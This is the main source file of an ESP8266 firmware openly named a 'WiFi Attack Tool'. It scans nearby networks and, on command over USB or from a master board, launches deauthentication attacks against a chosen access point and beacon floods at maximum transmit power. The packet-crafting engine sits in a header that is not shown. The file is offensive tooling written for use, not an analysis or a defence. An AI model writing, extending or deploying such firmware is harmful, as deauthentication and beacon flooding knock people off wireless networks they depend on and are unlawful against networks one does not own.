// ESP8266 WiFi Attack Tool | UART to Master: RX=GPIO3, TX=GPIO1

#include <SoftwareSerial.h>
#include "deauth_utils.h"
DeauthEngine engine;

// S3 Conn
SoftwareSerial MasterSerial(5, 4); // RX=D1(GPIO5), TX=D2(GPIO4)

// Buffers
String masterRxBuffer = "";
String usbRxBuffer = "";

// LED
#define LED_PIN 2

// Stat Tmr
unsigned long lastStats = 0;
const unsigned long STATS_INTERVAL = 1000;

// Setup

void setup() {
  Serial.begin(115200); // FAST baud for debug to prevent blocking
  delay(500);
  MasterSerial.begin(9600); // Connection to S3 Master

  // Max TX
  WiFi.setOutputPower(20.5);

  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);  // LED Off

  Serial.println();
  Serial.println(F("========================================"));
  Serial.println(F("  ESP8266 WiFi Attack Tool v1.0"));
  Serial.println(F("  NodeMCU v3 | Custom Implementation"));
  Serial.println(F("========================================"));
  Serial.println();

  printMenu();
}

// Main Loop

void loop() {
  // RX from Master
  while (MasterSerial.available()) {
    char c = (char)MasterSerial.read();
    if (c == '\n') {
      masterRxBuffer.trim();
      if (masterRxBuffer.length() > 0) {
        if (masterRxBuffer == "ping") {
          MasterSerial.println("pong");
        } else {
          handleCommand(masterRxBuffer);
        }
      }
      masterRxBuffer = "";
    } else if (c != '\r') {
      masterRxBuffer += c;
      if (masterRxBuffer.length() > 200) masterRxBuffer = ""; // Clr
    }
  }

  // RX from USB
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n') {
      usbRxBuffer.trim();
      if (usbRxBuffer.length() > 0) {
        handleCommand(usbRxBuffer);
      }
      usbRxBuffer = "";
    } else if (c != '\r') {
      usbRxBuffer += c;
      if (usbRxBuffer.length() > 200) usbRxBuffer = "";
    }
  }

  // Attack engine
  engine.update();

  // LED status
  if (engine.isActive()) {
    // LED blink
    digitalWrite(LED_PIN, (millis() / 200) % 2 == 0 ? LOW : HIGH);
  } else {
    digitalWrite(LED_PIN, HIGH);  // LED Off
  }

  // Stats
  if (engine.isActive() && millis() - lastStats >= STATS_INTERVAL) {
    lastStats = millis();
    Serial.printf("STATUS:%s:pkts=%lu:bursts=%lu\n",
                  engine.getModeName(),
                  engine.getPacketsSent(),
                  engine.getBurstCount());
    MasterSerial.printf("STATUS:WIFI:%lu:%lu\n",
                  engine.getPacketsSent(),
                  engine.getBurstCount());
  }
}

// Command Handler

void handleCommand(String line) {

  if (line.startsWith("CMD:")) {
    handleProtocolCommand(line.substring(4));
    return;
  }


  if (line == "scan") {
    doScan();
  }
  else if (line.startsWith("deauth ")) {
    int idx = line.substring(7).toInt() - 1;
    if (idx >= 0 && idx < engine.getNetworkCount()) {
      WiFiTarget t = engine.getTarget(idx);
      engine.startDeauth(t.bssid, t.channel);
    } else {
      Serial.println(F("[!] Invalid index. Run 'scan' first."));
    }
  }
  else if (line.startsWith("beacon ")) {
    String name = line.substring(7);
    engine.startBeaconFlood(name.c_str(), 6);  // Default ch 6
  }
  else if (line == "stop") {
    engine.stop();
  }
  else if (line == "status") {
    printStatus();
  }
  else if (line == "?") {
    printMenu();
  }
  else {
    Serial.printf("[?] Unknown: '%s' — type '?' for help\n", line.c_str());
    MasterSerial.printf("[?] Unknown: '%s'\n", line.c_str());
  }
}

// Protocol Handler

void handleProtocolCommand(String cmd) {
  if (cmd == "SCAN") {
    doScan();
  }
  else if (cmd.startsWith("DEAUTH:")) {
    // Fmt: DEAUTH:MAC:ch
    // Parse
    String params = cmd.substring(7);  // After "DEAUTH:"

    uint8_t bssid[6];
    uint8_t channel = 0;

    // Parse MAC
    int colonCount = 0;
    int lastColon = -1;
    for (int i = 0; i < params.length(); i++) {
      if (params.charAt(i) == ':') {
        colonCount++;
        if (colonCount == 6) {
          // Split
          String bssidStr = params.substring(0, i);
          channel = params.substring(i + 1).toInt();
          sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                 &bssid[0], &bssid[1], &bssid[2],
                 &bssid[3], &bssid[4], &bssid[5]);
          break;
        }
      }
    }

    if (channel > 0) {
      engine.startDeauth(bssid, channel);
      Serial.println("DEAUTH:ACTIVE");
      MasterSerial.println("DEAUTH:ACTIVE");
    } else {
      Serial.println("DEAUTH:ERROR:invalid params");
      MasterSerial.println("DEAUTH:ERROR:invalid params");
    }
  }
  else if (cmd.startsWith("BEACON:")) {
    // Fmt: BEACON:SSID:ch
    String params = cmd.substring(7);
    int lastColon = params.lastIndexOf(':');
    if (lastColon > 0) {
      String ssid = params.substring(0, lastColon);
      uint8_t ch = params.substring(lastColon + 1).toInt();
      engine.startBeaconFlood(ssid.c_str(), ch);
      Serial.println("BEACON:ACTIVE");
      MasterSerial.println("BEACON:ACTIVE");
    }
  }
  else if (cmd == "STOP") {
    engine.stop();
    Serial.println("STOP:OK");
    MasterSerial.println("STOP:OK");
  }
  else if (cmd == "STATUS") {
    printStatus();
  }
}

// WiFi Scan

void doScan() {
  Serial.println(F("\n[SCAN] Scanning WiFi networks..."));
  MasterSerial.println(F("SCANNING..."));
  int n = engine.scanNetworks();

  if (n == 0) {
    Serial.println(F("SCAN:0"));
    MasterSerial.println(F("SCAN:0"));
    return;
  }

  Serial.printf("SCAN:%d networks found\n", n);
  MasterSerial.printf("SCAN:%d networks found\n", n);
  Serial.println(F("─────────────────────────────────────────────"));

  for (int i = 0; i < n; i++) {
    WiFiTarget t = engine.getTarget(i);
    Serial.printf(" %2d) %-24s  BSSID:%s  Ch:%2d  %ddBm\n",
                  i + 1,
                  t.ssid.c_str(),
                  t.bssid_str.c_str(),
                  t.channel,
                  t.rssi);
    // TX Data
    MasterSerial.printf("NET:%d:%s:%d:%s:%d\n", 
                  i, t.ssid.c_str(), t.rssi, t.bssid_str.c_str(), t.channel);
  }
  MasterSerial.println(F("SCAN_COMPLETE"));
  Serial.println(F("─────────────────────────────────────────────"));
  Serial.println(F("Type 'deauth <number>' to attack a network"));
  Serial.println();
}

// Status & Menu

void printStatus() {
  Serial.printf("STATUS:%s:pkts=%lu:bursts=%lu\n",
                engine.getModeName(),
                engine.getPacketsSent(),
                engine.getBurstCount());
  MasterSerial.printf("STATUS:%s:pkts=%lu:bursts=%lu\n",
                engine.getModeName(),
                engine.getPacketsSent(),
                engine.getBurstCount());
}

void printMenu() {
  Serial.println(F("┌──────────────────────────────────────────┐"));
  Serial.println(F("│        ESP8266 WIFI ATTACK MENU          │"));
  Serial.println(F("├──────────────────────────────────────────┤"));
  Serial.println(F("│  scan           — Scan WiFi networks     │"));
  Serial.println(F("│  deauth <num>   — Deauth by scan index   │"));
  Serial.println(F("│  beacon <name>  — Beacon flood           │"));
  Serial.println(F("│  stop           — Stop current attack    │"));
  Serial.println(F("│  status         — Show attack status     │"));
  Serial.println(F("│  ?              — Show this menu         │"));
  Serial.println(F("└──────────────────────────────────────────┘"));
  Serial.println();
}
